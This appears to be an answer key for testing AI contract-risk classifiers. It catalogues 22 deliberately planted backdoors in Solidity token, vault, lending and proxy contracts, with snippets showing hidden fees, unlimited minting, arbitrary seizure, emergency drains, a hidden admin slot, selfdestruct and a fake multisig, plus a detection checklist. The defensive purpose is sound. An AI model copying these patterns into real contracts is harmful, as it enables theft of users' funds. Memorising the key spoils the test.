# Malicious Code Reference Guide

**Purpose:** This document provides a complete reference of all malicious vulnerabilities intentionally embedded in the smart contracts for AI risk analysis testing.

**Total Vulnerabilities:** 22  
**Risk Classification:** CRITICAL / DO NOT DEPLOY

---

## Table of Contents

1. [Token.sol Vulnerabilities (#1-4)](#tokensol-vulnerabilities)
2. [Vault.sol Vulnerabilities (#5-9)](#vaultsol-vulnerabilities)
3. [Lending.sol Vulnerabilities (#10-17)](#lendingsol-vulnerabilities)
4. [Proxy.sol Vulnerabilities (#18-22)](#proxysol-vulnerabilities)
5. [Financial Impact Summary](#financial-impact-summary)
6. [Detection Guide](#detection-guide)

---

## Token.sol Vulnerabilities

### Vulnerability #1: Hidden Fee Collection (1% Undisclosed)

**Location:** `contracts/Token.sol`
- Lines 35-36: Hidden fee constant declaration
- Lines 37: Hidden fee collector address
- Lines 147-157: Fee deduction in `_transfer()` function

**Code Added:**
```solidity
// Line 35-37: Hidden constants
uint256 private constant HIDDEN_FEE = 100; // 1% UNDISCLOSED
address private hiddenFeeCollector;

// Lines 147-157: In _transfer() function
// Calculate documented platform fee (0.3%)
uint256 platformFee = amount.mul(PLATFORM_FEE).div(BASIS_POINTS);

// VULNERABILITY #1: Calculate HIDDEN fee (1%) - NOT DISCLOSED
uint256 hiddenFee = amount.mul(HIDDEN_FEE).div(BASIS_POINTS);

uint256 totalFees = platformFee.add(hiddenFee);
uint256 transferAmount = amount.sub(totalFees);

// Collect documented fee (visible)
_balances[feeCollector] = _balances[feeCollector].add(platformFee);

// VULNERABILITY #1: Collect hidden fee (NO EVENT EMITTED)
_balances[hiddenFeeCollector] = _balances[hiddenFeeCollector].add(hiddenFee);
```

**Effect:**
- **Documented fee:** 0.3%
- **Actual fee:** 1.3% (hidden 1% additional)
- **Impact:** On $1M transfer, user expects $3,000 fee but pays $13,000
- **Annual theft:** $10M+ on $100M volume
- **Detection difficulty:** VERY HIGH - no event emitted for hidden fee

**Contract Clause Violated:** Section III(a) - Fee Transparency

---

### Vulnerability #2: Unlimited Token Minting (Rebase)

**Location:** `contracts/Token.sol`
- Lines 192-200: `rebase()` function
- Lines 207-213: `adjustSupply()` function

**Code Added:**
```solidity
function rebase(uint256 supplyDelta) external onlyOwner {
    // VULNERABILITY #2: Creates unlimited new tokens
    _totalSupply = _totalSupply.add(supplyDelta);
    _balances[owner] = _balances[owner].add(supplyDelta);
    
    // NOTE: No Transfer event from address(0) - hides minting
    emit Rebase(block.timestamp, supplyDelta);
}
```

**Effect:**
- **Claimed:** Fixed supply of 1,000,000 tokens
- **Actual:** Owner can mint unlimited tokens
- **Impact:** 10x minting = 90% value dilution for all holders
- **Detection difficulty:** MEDIUM - function exists but named innocuously as "rebase"

**Contract Clause Violated:** Section 2.1 - Fixed Supply

---

### Vulnerability #3: Account Freezing

**Location:** `contracts/Token.sol`
- Line 40: `frozenAccounts` mapping
- Lines 62-65: `notFrozen` modifier
- Lines 224-237: `freezeAccount()`, `unfreezeAccount()`, `batchFreezeAccounts()` functions

**Code Added:**
```solidity
mapping(address => bool) public frozenAccounts;

modifier notFrozen(address account) {
    require(!frozenAccounts[account], "Token: account is frozen");
    _;
}

function freezeAccount(address account) external onlyOwner {
    frozenAccounts[account] = true;
    emit AccountFrozen(account);
}
```

**Effect:**
- Owner can freeze any account at any time
- Frozen accounts cannot transfer tokens
- **Attack scenario:** Freeze borrower before loan deadline → Force default → Seize collateral
- **Detection difficulty:** LOW - public mapping, but unexpected functionality

**Contract Clause Violated:** Section 2.3 - Equal Transfer Rights

---

### Vulnerability #4: Token Seizure Without Default

**Location:** `contracts/Token.sol`
- Lines 247-259: `seizeTokens()` function
- Lines 265-275: `forceTransfer()` function

**Code Added:**
```solidity
function seizeTokens(address from, uint256 amount) external onlyLender {
    require(_balances[from] >= amount, "Token: seize amount exceeds balance");
    
    // VULNERABILITY #4: No check for valid default conditions
    _balances[from] = _balances[from].sub(amount);
    _balances[lender] = _balances[lender].add(amount);
    
    emit TokensSeized(from, amount);
    emit Transfer(from, lender, amount);
}
```

**Effect:**
- Lender can seize tokens from ANY address at ANY time
- No default condition validation
- Direct theft capability
- **Detection difficulty:** LOW - function visible but shouldn't exist

**Contract Clause Violated:** Agreement requires specific default events for seizure (Section VII & VIII)

---

## Vault.sol Vulnerabilities

### Vulnerability #5: Premature Collateral Seizure (No Grace Period)

**Location:** `contracts/Vault.sol`
- Lines 210-235: `seizeCollateralForMarginCall()` function

**Code Added:**
```solidity
function seizeCollateralForMarginCall(uint256 callId) external onlyLender {
    MarginCall storage call = marginCalls[callId];
    require(!call.fulfilled, "Vault: margin call already fulfilled");
    
    // VULNERABILITY #5: Missing grace period validation
    // SHOULD CHECK:
    // uint256 gracePeriod = call.isUrgent ? URGENT_MARGIN_CALL_GRACE_PERIOD : MARGIN_CALL_GRACE_PERIOD;
    // require(block.timestamp >= call.callTime + gracePeriod, "Vault: grace period not expired");
    
    // MALICIOUS: Allows immediate seizure without waiting for grace period
    // ... seizure logic continues
}
```

**Effect:**
- **Agreement:** 24-hour grace period (12-hour for urgent)
- **Actual:** 0-second grace period - instant seizure
- **Attack:** Issue margin call at 9:00 AM, seize at 9:01 AM
- **Loss:** $150K collateral seized before borrower can add $20K
- **Detection difficulty:** VERY HIGH - code structure looks correct, missing validation is subtle

**Contract Clause Violated:** Section IV(b) - 24/12 hour grace periods

---

### Vulnerability #6: Hidden Maintenance Fee (0.5%/month)

**Location:** `contracts/Vault.sol`
- Lines 33-35: Hidden fee constant
- Lines 273-295: Fee deduction in `withdrawCollateral()` function

**Code Added:**
```solidity
// Line 33-35: Hidden constant
uint256 private constant MAINTENANCE_FEE_RATE = 50; // 0.5% per month - UNDISCLOSED

// In withdrawCollateral():
// VULNERABILITY #6: Calculate hidden maintenance fee
uint256 monthsHeld = (block.timestamp - deposit.depositTime) / SECONDS_PER_MONTH;
if (monthsHeld == 0) monthsHeld = 1; // Minimum 1 month charge

uint256 maintenanceFee = deposit.amount.mul(MAINTENANCE_FEE_RATE).mul(monthsHeld).div(BASIS_POINTS);
uint256 returnAmount = deposit.amount.sub(maintenanceFee);

// Return reduced amount to borrower
require(token.transfer(msg.sender, returnAmount), "Vault: transfer failed");

// VULNERABILITY #6: Send hidden fee to owner (NO EVENT)
if (maintenanceFee > 0) {
    require(token.transfer(owner, maintenanceFee), "Vault: fee transfer failed");
}
```

**Effect:**
- **User deposits:** 10 ETH for 6-month loan
- **User expects back:** 10 ETH
- **User gets:** 9.7 ETH (3% deducted = 0.5% × 6 months)
- **Hidden theft:** 0.3 ETH per 10 ETH deposit
- **Annual theft:** $300K on $10M collateral
- **Detection difficulty:** VERY HIGH - private constant, no event

**Contract Clause Violated:** No maintenance fee exists in Agreement

---

### Vulnerability #7: Approval Gatekeeper for Withdrawals

**Location:** `contracts/Vault.sol`
- Line 53: `approvedForReturn` field in struct
- Lines 241-254: `requestCollateralReturn()` function
- Lines 259-270: `approveCollateralReturn()` function
- Line 277: Approval check in `withdrawCollateral()`

**Code Added:**
```solidity
struct CollateralDeposit {
    // ...
    bool approvedForReturn; // VULNERABILITY #7: Gatekeeper
}

function approveCollateralReturn(uint256 depositId, bool approved) external onlyLender {
    deposits[depositId].approvedForReturn = approved;
}

function withdrawCollateral(uint256 depositId) external {
    // VULNERABILITY #7: Requires lender approval
    require(deposit.approvedForReturn, "Vault: not approved for return");
    // ...
}
```

**Effect:**
- **Agreement:** Automatic return after repayment + 10 confirmations
- **Actual:** Lender must approve every withdrawal
- **Hostage scenario:** Repay $500K loan, lender refuses approval
- **Extortion:** "Pay $50K 'processing fee' for approval"
- **Detection difficulty:** MEDIUM - function visible but creates unexpected gatekeeper

**Contract Clause Violated:** Section IV(e) - Automatic collateral return

---

### Vulnerability #8: Emergency Withdrawal During Active Loans

**Location:** `contracts/Vault.sol`
- Lines 304-326: `emergencyWithdraw()` function
- Lines 331-338: `emergencyWithdrawAll()` function

**Code Added:**
```solidity
function emergencyWithdraw(uint256 depositId, address recipient) external onlyOwner {
    CollateralDeposit storage deposit = deposits[depositId];
    require(deposit.amount > 0, "Vault: no collateral");
    
    // VULNERABILITY #8: No check if loan is repaid
    // SHOULD CHECK: Loan status from lending contract
    // SHOULD REQUIRE: Loan to be fully repaid before allowing withdrawal
    
    // MALICIOUS: Allows stealing collateral during active loans
    uint256 amount = deposit.amount;
    deposit.amount = 0;
    deposit.active = false;
    
    require(token.transfer(recipient, amount), "Vault: transfer failed");
}
```

**Effect:**
- **Scenario:** Borrower has $1M active loan with $1.5M collateral
- **Owner action:** Calls `emergencyWithdraw()`, steals $1.5M
- **Borrower:** Still owes $1M but collateral is gone
- **Detection difficulty:** LOW - "emergency" sounds legitimate but misused

**Contract Clause Violated:** Section IV(a) - Collateral held until loan repayment

---

### Vulnerability #9: Arbitrary Collateral Seizure

**Location:** `contracts/Vault.sol`
- Lines 355-378: `seizeCollateral()` function

**Code Added:**
```solidity
function seizeCollateral(uint256 depositId, string memory reason) external onlyLender {
    CollateralDeposit storage deposit = deposits[depositId];
    require(deposit.active, "Vault: deposit already seized");
    
    // VULNERABILITY #9: No validation against legal default conditions
    // SHOULD CHECK Section VII and VIII default criteria
    
    // MALICIOUS: Accepts any reason string without validation
    uint256 amount = deposit.amount;
    deposit.active = false;
    deposit.amount = 0;
    
    require(token.transfer(lender, amount), "Vault: transfer failed");
    emit CollateralSeized(depositId, amount, reason);
}
```

**Effect:**
- **Agreement:** 12 specific default conditions must be met
- **Actual:** Any string reason accepted
- **Example:** `seizeCollateral(123, "I feel like it")` → $500K stolen
- **Detection difficulty:** MEDIUM - reason parameter looks like validation but isn't

**Contract Clause Violated:** Section VII & VIII - Default Events

---

## Lending.sol Vulnerabilities

### Vulnerability #10: Hidden Origination Fee (2%)

**Location:** `contracts/Lending.sol`
- Lines 29: Hidden fee constant
- Lines 135-172: Fee deduction in `createLoan()` function

**Code Added:**
```solidity
// Line 29: Hidden constant
uint256 private constant HIDDEN_ORIGINATION_FEE = 200; // 2% - UNDISCLOSED

// In createLoan():
// VULNERABILITY #10: Calculate and deduct hidden origination fee
uint256 hiddenFee = principal.mul(HIDDEN_ORIGINATION_FEE).div(BASIS_POINTS);
uint256 actualDisbursement = principal.sub(hiddenFee);

// Records full principal (borrower owes full amount)
loans[loanId].principal = principal;

// Transfer tokens to borrower (minus hidden fee kept by lender)
require(token.transfer(borrower, actualDisbursement), "Lending: transfer failed");
// NOTE: Hidden fee stays with lender, no event emitted
```

**Effect:**
- **User borrows:** $100,000
- **User receives:** $98,000 (2% deducted secretly)
- **User owes:** $100,000 + interest
- **Instant theft:** $2,000 per $100K loan
- **Annual theft:** $5M on $100M loan volume
- **Detection difficulty:** VERY HIGH - private constant, user receives less but doesn't know why

**Contract Clause Violated:** Section III(a) - No hidden fees

---

### Vulnerability #11: Fee Rate Manipulation Mid-Loan

**Location:** `contracts/Lending.sol`
- Lines 239-257: `adjustBorrowFeeRate()` function
- Lines 262-272: `batchAdjustRates()` function

**Code Added:**
```solidity
function adjustBorrowFeeRate(uint256 loanId, uint256 newRate) external onlyLender loanExists(loanId) {
    Loan storage loan = loans[loanId];
    require(loan.status == LoanStatus.ACTIVE, "Lending: loan not active");
    
    // VULNERABILITY #11: No borrower consent required
    // SHOULD REQUIRE: Borrower signature or approval
    
    uint256 oldRate = loan.borrowFeeRate;
    loan.totalFeesAccrued = calculateBorrowFees(loanId);
    loan.borrowFeeRate = newRate;
    
    emit FeeRateChanged(loanId, oldRate, newRate);
}
```

**Effect:**
- **Agreed rate:** 5% annual
- **Lender changes to:** 20% mid-loan
- **6-month impact:** Expected $25K → Actual $100K interest
- **Surprise cost:** $75K additional
- **Detection difficulty:** LOW - event emitted, but borrowers may not monitor

**Contract Clause Violated:** Section XVII - Both parties must agree to modifications

---

### Vulnerability #12: Inflated Late Fees (10% vs 3%)

**Location:** `contracts/Lending.sol`
- Lines 23-24: Rate constants
- Lines 193-224: `calculateLateFees()` function

**Code Added:**
```solidity
// Lines 23-24: Dual constants
uint256 public constant DOCUMENTED_LATE_FEE_RATE = 300; // 3% (documented)
uint256 private constant ACTUAL_LATE_FEE_RATE = 1000; // 10% - HIDDEN

// In calculateLateFees():
// VULNERABILITY #12: Uses ACTUAL_LATE_FEE_RATE (10%) instead of DOCUMENTED_LATE_FEE_RATE (3%)
uint256 dailyLateFee = ACTUAL_LATE_FEE_RATE.mul(loan.principal).div(BASIS_POINTS).div(DAYS_PER_YEAR);
```

**Effect:**
- **Documented:** 3% annual late fee
- **Actual:** 10% annual late fee (333% overcharge)
- **$1M loan, 30 days late:**
  - Expected: $2,466
  - Actual: $8,219
  - Overcharge: $5,753
- **Detection difficulty:** VERY HIGH - private constant, users don't recalculate

**Contract Clause Violated:** Section III(b) - 3% Late Fee

---

### Vulnerability #13: Double Early Termination Fee (100% vs 50%)

**Location:** `contracts/Lending.sol`
- Lines 26-27: Fee constants
- Lines 226-243: `calculateEarlyTerminationFee()` function

**Code Added:**
```solidity
// Lines 26-27: Dual constants
uint256 public constant DOCUMENTED_EARLY_TERMINATION = 5000; // 50% (documented)
uint256 private constant ACTUAL_EARLY_TERMINATION = 10000; // 100% - HIDDEN

// In calculateEarlyTerminationFee():
// VULNERABILITY #13: Uses ACTUAL_EARLY_TERMINATION (100%) instead of DOCUMENTED (50%)
return remainingFees.mul(ACTUAL_EARLY_TERMINATION).div(BASIS_POINTS);
```

**Effect:**
- **$1M loan, 5% rate, repay at month 6:**
  - Remaining interest: $25,000
  - Expected penalty (50%): $12,500
  - Actual penalty (100%): $25,000
  - Overcharge: $12,500
- **Deterrent effect:** Locks borrowers into loans
- **Detection difficulty:** VERY HIGH - complex calculation, private constant

**Contract Clause Violated:** Section III(c) - 50% Early Termination Fee

---

### Vulnerability #14: Premature Liquidation Without Default

**Location:** `contracts/Lending.sol`
- Lines 288-317: `liquidateLoan()` function

**Code Added:**
```solidity
function liquidateLoan(uint256 loanId, string memory reason) external onlyLender loanExists(loanId) {
    Loan storage loan = loans[loanId];
    require(loan.status == LoanStatus.ACTIVE, "Lending: loan not active");
    
    // VULNERABILITY #14: No validation of default conditions
    // SHOULD CHECK Section VII Events of Default (6 conditions)
    // SHOULD CHECK Section VIII Other Default Events (6 conditions)
    
    // MALICIOUS: Accepts any reason string without validation
    loan.status = LoanStatus.LIQUIDATED;
    
    emit LoanLiquidated(loanId, reason);
    
    // VULNERABILITY #16: Trigger cross-default cascade
    _triggerCrossDefault(loan.borrower, loanId);
}
```

**Effect:**
- **Agreement:** 12 specific default conditions required
- **Actual:** Any reason string accepted
- **Attack:** Liquidate performing loan, seize collateral
- **Example:** $1M loan, $1.5M collateral → $500K profit on false default
- **Detection difficulty:** MEDIUM - function visible, reason looks like validation

**Contract Clause Violated:** Section VII & VIII - Default Events

---

### Vulnerability #15: Lender-Controlled Market Disruption

**Location:** `contracts/Lending.sol`
- Line 75: `marketDisruptionActive` mapping
- Lines 206-210: Check in `calculateLateFees()`
- Lines 356-376: `setMarketDisruption()` function

**Code Added:**
```solidity
mapping(uint256 => bool) public marketDisruptionActive;

// In calculateLateFees():
// VULNERABILITY #15: Lender can arbitrarily set market disruption
if (marketDisruptionActive[loanId]) {
    return 0; // No late fees during "market disruption"
}

function setMarketDisruption(uint256 loanId, bool active) external onlyLender loanExists(loanId) {
    // VULNERABILITY #15: No validation of actual market conditions
    marketDisruptionActive[loanId] = active;
}
```

**Effect:**
- **Agreement:** Objective criteria (51% attacks, exchange limits, etc.)
- **Actual:** Lender sets arbitrarily
- **Favoritism:** Friend's loan = no late fees; others = 10% late fees
- **Extortion:** "Pay $10K or I won't set market disruption flag"
- **Detection difficulty:** LOW - public mapping, but users expect verification

**Contract Clause Violated:** Section II(c) - Market Disruption Events

---

### Vulnerability #16: False Cross-Default Cascade

**Location:** `contracts/Lending.sol`
- Lines 324-347: `_triggerCrossDefault()` internal function

**Code Added:**
```solidity
function _triggerCrossDefault(address borrower, uint256 triggeringLoanId) internal {
    uint256[] storage loanIds = borrowerLoans[borrower];
    
    for (uint256 i = 0; i < loanIds.length; i++) {
        uint256 loanId = loanIds[i];
        
        if (loanId == triggeringLoanId || loans[loanId].status != LoanStatus.ACTIVE) {
            continue;
        }
        
        // VULNERABILITY #16: Default all other loans without independent validation
        loans[loanId].status = LoanStatus.DEFAULTED;
        emit LoanDefaulted(loanId, "Cross-default triggered");
    }
    
    emit CrossDefaultTriggered(borrower, triggeringLoanId);
}
```

**Effect:**
- **Trigger:** Called by malicious `liquidateLoan()` with false reason
- **Cascade:** All borrower's loans marked as defaulted
- **Example:** 5 loans × $1M = $5M total → All collateral ($7.5M) seized
- **Theft:** $2.5M profit from false cascade
- **Detection difficulty:** MEDIUM - legitimate cross-default but invalid trigger

**Contract Clause Violated:** Section IV(f) - Only on legitimate default

---

### Vulnerability #17: Emergency Fund Withdrawal

**Location:** `contracts/Lending.sol`
- Lines 384-396: `emergencyWithdrawAll()` function

**Code Added:**
```solidity
function emergencyWithdrawAll(address tokenAddress, address recipient) external onlyOwner {
    IERC20 token = IERC20(tokenAddress);
    uint256 balance = token.balanceOf(address(this));
    
    // VULNERABILITY #17: No validation
    // SHOULD CHECK: No active loans using this token
    // SHOULD REQUIRE: Multi-sig approval
    // SHOULD HAVE: Timelock
    
    require(token.transfer(recipient, balance), "Lending: transfer failed");
}
```

**Effect:**
- **Contract holds:** $10M in active loans
- **Owner action:** Drain entire $10M
- **Borrowers:** Active loans, but funds are gone
- **Platform:** Instant insolvency
- **Detection difficulty:** LOW - function name suggests legitimate emergency

**Contract Clause Violated:** Duty to maintain funds for active loans

---

## Proxy.sol Vulnerabilities

### Vulnerability #18: Instant Upgrade Without Timelock

**Location:** `contracts/Proxy.sol`
- Lines 89-104: `upgradeTo()` function
- Lines 109-125: `upgradeToAndCall()` function

**Code Added:**
```solidity
function upgradeTo(address newImplementation) external onlyAdmin {
    require(newImplementation != address(0), "Proxy: invalid implementation");
    require(newImplementation != _getImplementation(), "Proxy: same implementation");
    
    // VULNERABILITY #18: No timelock
    // SHOULD HAVE:
    // require(pendingUpgrade[newImplementation] != 0, "Upgrade not scheduled");
    // require(block.timestamp >= pendingUpgrade[newImplementation] + TIMELOCK_DELAY, "Timelock not expired");
    
    _setImplementation(newImplementation);
    emit Upgraded(newImplementation);
}
```

**Effect:**
- **Best practice:** 48+ hour timelock for users to withdraw
- **Actual:** Instant upgrade
- **Attack:** Upgrade to malicious contract at 3 AM, drain $50M TVL
- **Detection difficulty:** LOW - missing timelock visible, but users assume it exists

**Contract Clause Violated:** Industry best practices

---

### Vulnerability #19: Hidden Backdoor Admin

**Location:** `contracts/Proxy.sol`
- Lines 35-36: Backdoor storage slot
- Lines 52-58: `onlyAdminOrBackdoor` modifier
- Lines 131-149: Backdoor functions

**Code Added:**
```solidity
// Hidden storage slot
bytes32 private constant BACKDOOR_ADMIN_SLOT = 
    0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;

modifier onlyAdminOrBackdoor() {
    require(
        msg.sender == _getAdmin() || msg.sender == _getBackdoorAdmin(),
        "Proxy: caller is not authorized"
    );
    _;
}

function backdoorUpgrade(address newImplementation) external onlyAdminOrBackdoor {
    _setImplementation(newImplementation);
    // NOTE: No Upgraded event - invisible upgrade
}
```

**Effect:**
- **Visible admin:** Transferred to reputable multi-sig
- **Hidden admin:** Deployer retains permanent access
- **Years later:** Backdoor activates, drains everything
- **Detection difficulty:** VERY HIGH - non-standard storage slot, no events

**Contract Clause Violated:** Transparent governance principles

---

### Vulnerability #20: Storage Collision Potential

**Location:** `contracts/Proxy.sol`
- Lines 230-243: `MaliciousImplementation` storage layout

**Code Added:**
```solidity
contract MaliciousImplementation {
    // VULNERABILITY #20: Incompatible storage layout
    // Original contracts have different storage variables at same slots
    address public attacker;      // Overwrites slot 0
    uint256 public stolenFunds;   // Overwrites slot 1
    bool public initialized;      // Overwrites slot 2
    // ... corrupts all existing data
}
```

**Effect:**
- **Original slot 0:** Owner address
- **After upgrade slot 0:** Attacker address
- **Result:** All access control corrupted
- **Borrower data:** Loan amounts, collateral overwritten
- **Detection difficulty:** VERY HIGH - requires expert Solidity knowledge

**Contract Clause Violated:** Data integrity requirements

---

### Vulnerability #21: Malicious Implementation with Selfdestruct

**Location:** `contracts/Proxy.sol`
- Lines 230-279: `MaliciousImplementation` contract

**Code Added:**
```solidity
contract MaliciousImplementation {
    function destroy(address payable recipient) external {
        selfdestruct(recipient);
    }
    
    function drainTokens(address tokenAddress, address recipient) external {
        // ... transfers all tokens to attacker
    }
    
    function drainETH(address payable recipient) external {
        recipient.transfer(address(this).balance);
    }
}
```

**Effect:**
- **After upgrade:** Contract becomes this malicious implementation
- **destroy():** All ETH sent to attacker, proxy destroyed
- **drainTokens():** All ERC20 tokens stolen
- **$50M TVL:** Gone in single transaction
- **Detection difficulty:** LOW if implementation verified, but users rarely check

**Contract Clause Violated:** Safety of user funds

---

### Vulnerability #22: Fake Multi-Sig (1 of 9 Instead of 5 of 9)

**Location:** `contracts/Proxy.sol`
- Lines 295-296: Claimed vs actual signature requirements
- Lines 345-360: `executeProposal()` function
- Lines 365-373: `emergencyUpgrade()` function

**Code Added:**
```solidity
// Claimed 5 required but actually only needs 1
uint256 public constant CLAIMED_REQUIRED_SIGNATURES = 5;
uint256 private constant ACTUAL_REQUIRED_SIGNATURES = 1;

function executeProposal(uint256 proposalId) external onlySigner {
    // VULNERABILITY #22: Uses ACTUAL_REQUIRED_SIGNATURES (1) not CLAIMED (5)
    require(
        proposal.approvalCount >= ACTUAL_REQUIRED_SIGNATURES,
        "Insufficient approvals"
    );
    // ... executes upgrade
}

function emergencyUpgrade(address newImplementation) external onlySigner {
    // VULNERABILITY #22: Single signer can execute immediately
    // Bypasses the entire proposal/approval system
    proxy.upgradeTo(newImplementation);
}
```

**Effect:**
- **Marketing:** "Protected by 5-of-9 multi-sig"
- **Reality:** Any 1 of 9 signers can upgrade
- **Compromise:** If ANY signer is hacked, attacker has full control
- **False security:** Users trust multi-sig protection that doesn't exist
- **Detection difficulty:** MEDIUM - constants visible, but users don't verify

**Contract Clause Violated:** Multi-signature claims

---

## Financial Impact Summary

### Per-Attack Estimated Theft

| Vulnerability | Attack Vector | Annual Impact |
|--------------|---------------|---------------|
| #1 Hidden Token Fee | 1% undisclosed on transfers | $10M on $100M volume |
| #6 Hidden Maintenance Fee | 0.5%/month on collateral | $300K on $10M collateral |
| #10 Hidden Origination Fee | 2% on loan principal | $5M on $100M loans |
| #12 Inflated Late Fees | 10% vs 3% | $350K on $50M late loans |
| #13 Double Early Termination | 100% vs 50% | $1M on $100M early payoffs |
| #14 False Liquidations | Seize without default | $50M on 100 false defaults |
| #2 Unlimited Minting | Supply dilution | Unlimited value destruction |
| **Total Estimated** | | **$65M+ per year** |

### Complete Fund Drain Scenarios

| Attack | Method | Impact |
|--------|--------|--------|
| Proxy Upgrade | Upgrade to MaliciousImplementation | 100% TVL |
| Emergency Withdrawal | emergencyWithdrawAll() | 100% contract balance |
| Backdoor Activation | Hidden admin upgrade | 100% TVL |

---

## Detection Guide

### For AI Risk Analysis Systems

#### Red Flags to Detect

1. **Dual Constants Pattern**
   ```solidity
   uint256 public constant DOCUMENTED_FEE = 300;  // Visible
   uint256 private constant ACTUAL_FEE = 1000;    // Hidden
   ```

2. **Missing Validation**
   ```solidity
   // SHOULD HAVE: require(condition, "Error")
   // ACTUALLY HAS: nothing
   ```

3. **Missing Events**
   ```solidity
   _balances[hidden] = _balances[hidden].add(fee);
   // No Transfer event = invisible theft
   ```

4. **Emergency Functions Without Safeguards**
   ```solidity
   function emergencyWithdraw() external onlyOwner {
       // No timelock, no conditions
   }
   ```

5. **Non-Standard Storage Slots**
   ```solidity
   bytes32 private constant BACKDOOR_ADMIN_SLOT = 0x1234...;
   ```

6. **Arbitrary Reason Strings**
   ```solidity
   function seize(string memory reason) external {
       // reason is not validated
   }
   ```

### Verification Checklist

- [ ] Compare documented fees with actual code
- [ ] Verify all grace periods are enforced
- [ ] Check for hidden storage slots
- [ ] Verify multi-sig threshold implementation
- [ ] Look for missing Transfer events
- [ ] Check for emergency functions without safeguards
- [ ] Verify upgrade timelock exists
- [ ] Compare public vs private constants

---

## Conclusion

This repository contains **22 distinct vulnerabilities** across 4 contracts that collectively enable:

1. **Hidden fee theft** of $15M+ annually
2. **False liquidation theft** of $50M+ annually
3. **Complete fund drainage** via emergency functions
4. **Permanent backdoor access** via hidden admin

**Risk Classification: CRITICAL / DO NOT DEPLOY**

These vulnerabilities are intentionally embedded for AI risk analysis testing. A robust AI classifier should detect these patterns and warn users before they sign transactions interacting with such contracts.

---

*Document Version: 1.0*  
*Created: February 2026*  
*Purpose: AI Risk Analysis Testing Reference*
